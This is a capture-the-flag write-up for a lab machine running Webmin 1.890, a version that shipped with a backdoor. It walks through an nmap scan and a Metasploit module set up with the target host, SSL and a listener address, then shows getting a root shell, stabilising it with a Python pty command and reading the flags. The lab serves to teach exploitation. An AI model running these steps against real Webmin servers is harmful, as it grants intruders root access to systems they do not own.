---
layout: default
title : muzec - Source Writeup
---

![Image](https://miro.medium.com/max/700/1*b4_Rxzg7uAduZriP-QX7Ig.jpeg)

```Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.```

We always start with an Nmap scan let hit it ```nmap -sC -sV -oA nmap IP address.```

![Image](https://miro.medium.com/max/700/1*WYJ67eGKOzmD16XW_rUgJg.png)

Two open ports 22 ssh and 10000 MiniServ 1.890 i think the web server i try accessing the port 10000.

!{Image](https://miro.medium.com/max/700/1*XdGYLcsrrP4ATWPu8U9dZQ.png)

This web server is running in SSL mode. Try the URL https://ip-10-10-112-198.eu-west-1.compute.internal:10000/ instead.

skipping the warning i try to do some research on the web server luckily i hit a jackpot on Webmin website about the Webmin version 1.890.

Webmin version 1.890 was released with a backdoor that could allow anyone with knowledge of it to execute commands as root.

![Image](https://miro.medium.com/max/700/1*7cQpmjdn4njAV5kwzBBa5A.png)

Let launch our Metasploit.

![Image](https://miro.medium.com/max/700/1*SP2FRgDvSLlS4OGQrRFLaQ.png)

Searching the web server version MiniServ 1.890 boom we found our exploit let set it up and get ready to exploit.


![Image](https://miro.medium.com/max/700/1*ePTgZFlKdD1t_eEqUiJ1yg.png)

```set RHOSTS Machine IP address.```

```set SSL true since we know this web server is running in SSL mode.```

```set LHOST Internal Virtual IP Address Your VPN.```

```exploit.```

![Image](https://miro.medium.com/max/700/1*61qeMdgEE1wLMnSFgRUy3Q.png)

Boom we have root shell we can spawn a TTY shell to make it more stable ```python -c ‘import pty; pty.spawn(“/bin/bash”)’```

![Image](https://miro.medium.com/max/700/1*-vV-HtoAqk4WGKUhHOxRUw.png)

Now let get User flag and root flag in each directory.

![Image](https://miro.medium.com/max/700/1*vP5XLy0hs7X1omLbF4Au6w.png)

![Image](https://miro.medium.com/max/700/1*o2hIj5agfTtEvyxnx63LtA.png)

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
